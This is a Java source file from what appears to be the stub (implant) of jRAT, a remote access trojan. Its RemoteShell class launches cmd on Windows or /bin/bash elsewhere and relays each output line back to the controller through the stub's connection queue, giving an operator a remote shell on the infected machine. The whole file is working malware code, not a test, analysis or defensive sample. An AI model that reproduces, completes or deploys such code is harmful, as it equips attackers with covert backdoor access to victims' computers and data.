package io.jrat.stub;

import io.jrat.common.OperatingSystem;
import io.jrat.stub.packets.outgoing.Packet21RemoteShell;

import java.io.BufferedReader;
import java.io.InputStreamReader;


public class RemoteShell extends Thread {

	public static Process p;

	public void run() {
		String line;
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				p = Runtime.getRuntime().exec("cmd");
			} else {
				ProcessBuilder builder = new ProcessBuilder("/bin/bash");
				builder.redirectErrorStream(true);
				p = builder.start();
			}
			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((line = input.readLine()) != null) {
				if (!line.trim().equals("")) {
					Connection.addToSendQueue(new Packet21RemoteShell(line));
				}
			}
			input.close();
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.addToSendQueue(new Packet21RemoteShell("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}